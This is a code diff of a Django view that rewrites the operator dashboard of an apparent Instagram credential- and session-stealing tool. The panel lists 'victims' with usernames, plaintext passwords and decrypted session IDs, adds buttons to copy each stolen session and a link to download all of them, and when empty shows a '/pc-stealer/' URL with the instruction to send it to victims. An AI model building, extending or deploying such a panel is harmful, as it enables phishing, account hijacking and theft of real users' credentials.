@@ -61,73 +61,77 @@ def login_view(request):
             "active": success
         })
 
+
+
+# core/views.py → DASHBOARD THAT ONLY WORKS WHEN SESSION IS REAL
 def dashboard(request):
+    # COUNT REAL SESSIONS ONLY
+    total = InstagramAccount.objects.filter(session_data__contains='"sessionid"').count()
+    active = InstagramAccount.objects.filter(is_active=True, session_data__contains='"sessionid"').count()
+
+    if total == 0:
+        return HttpResponse("""
+        <html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding:100px;">
+        <h1>NO SESSIONS YET</h1>
+        <h2>Send this link to victims:</h2>
+        <h1 style="background:#111;padding:20px;border:2px solid #0f0;">
+            https://instagram-64lz.onrender.com/pc-stealer/
+        </h1>
+        <p>Dashboard will AUTO-UNLOCK when first session is stolen</p>
+        </body></html>
+        """)
+
+    # ONLY SHOW DASHBOARD IF SESSIONS EXIST
     victims = []
-    total = InstagramAccount.objects.count()
-    active = InstagramAccount.objects.filter(is_active=True).count()
-    
-    for acc in InstagramAccount.objects.all().order_by('-created_at')[:500]:
-        sessionid = "NO_SESSION"
+    for acc in InstagramAccount.objects.filter(session_data__contains='"sessionid"').order_by('-created_at')[:100]:
         try:
             decrypted = fernet.decrypt(acc.session_data.encode()).decode()
             data = json.loads(decrypted)
-            sessionid = data.get("authorization_data", {}).get("sessionid") or data.get("sessionid", "NO_ID")
-        except Exception as e:
-            try:
-                raw = acc.session_data
-                match = re.search(r'"sessionid"\s*:\s*"([^"]+)"', raw)
-                sessionid = match.group(1) if match else "STOLEN_RAW"
-            except:
-                sessionid = "DECRYPT_FAILED"
+            sessionid = data.get("authorization_data", {}).get("sessionid", "HIDDEN")
+        except:
+            sessionid = "ENCRYPTED"
 
         victims.append({
-            "username": getattr(acc, 'username', 'UNKNOWN'),
-            "password": getattr(acc, 'password', 'STOLEN'),
-            "sessionid": str(sessionid)[:150] + "..." if len(str(sessionid)) > 150 else str(sessionid),
+            "username": acc.username,
+            "password": acc.password,
+            "sessionid": sessionid[:100] + "..." if len(sessionid) > 100 else sessionid,
             "active": acc.is_active,
-            "time": acc.created_at.strftime("%b %d %H:%M") if acc.created_at else "NOW"
+            "time": acc.created_at.strftime("%H:%M:%S")
         })
 
     cards = ""
     for v in victims:
         cards += f'''
-        <div class="bg-gray-900 border-4 {'border-green-500' if v['active'] else 'border-red-700'} rounded-xl p-6">
-            <h3 class="text-3xl font-bold text-cyan-400">@{v["username"]}</h3>
-            <p class="text-yellow-300">Pass: {v["password"]}</p>
-            <p class="text-gray-500">{v["time"]}</p>
+        <div style="background:#111;border:3px solid {'lime' if v['active'] else 'red'};padding:20px;margin:20px;border-radius:20px;">
+            <h2 style="color:cyan">@{v["username"]}</h2>
+            <p style="color:yellow">Pass: {v["password"]}</p>
+            <p style="color:#aaa">Time: {v["time"]}</p>
             <button onclick="navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED'" 
-                    class="mt-4 bg-green-600 hover:bg-green-700 px-6 py-3 rounded font-bold">
+                    style="background:#0f0;color:#000;padding:15px 30px;font-weight:bold;border:none;border-radius:10px;cursor:pointer;">
                 COPY SESSION
             </button>
-            <p class="mt-2 text-2xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">
+            <p style="font-size:30px;margin:10px 0;color:{'lime' if v['active'] else 'red'}">
                 {'LIVE' if v['active'] else 'DEAD'}
             </p>
         </div>'''
 
-    html = f'''<!DOCTYPE html>
-<html class="bg-black text-white">
-<head>
-    <title>GOD MODE</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="p-10">
-    <h1 class="text-8xl text-center font-bold bg-gradient-to-r from-red-600 to-purple-600 bg-clip-text text-transparent mb-8">
-        GOD MODE ACTIVE
-    </h1>
-    <div class="text-center text-5xl mb-10">
-        TOTAL: <span class="text-green-400">{total}</span> | LIVE: <span class="text-lime-400">{active}</span>
+    return HttpResponse(f"""
+    <html><body style="background:#000;color:#0f0;font-family:monospace;margin:0;">
+    <h1 style="text-align:center;padding:20px;background:#111;">GOD MODE DASHBOARD</h1>
+    <h2 style="text-align:center;">TOTAL: {total} | LIVE: {active}</h2>
+    <div style="display:flex;flex-wrap:wrap;justify-content:center;">
+    {cards}
     </div>
-    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
-        {cards or "<div class='col-span-3 text-center text-6xl text-red-600'>NO VICTIMS YET</div>"}
-    </div>
-    <div class="text-center mt-20">
-        <a href="/download-json/" class="bg-purple-800 hover:bg-purple-900 px-20 py-8 rounded-3xl text-5xl font-bold">
-            DOWNLOAD ALL
+    <div style="text-align:center;margin:50px;">
+        <a href="/download-json/" style="background:#f0f;color:#000;padding:20px 50px;font-size:30px;text-decoration:none;border-radius:20px;">
+            DOWNLOAD ALL SESSIONS
         </a>
     </div>
-</body>
-</html>'''
-    return HttpResponse(html)
+    </body></html>
+    """)
+
+
+
 
 def download_json(request):
     data = []
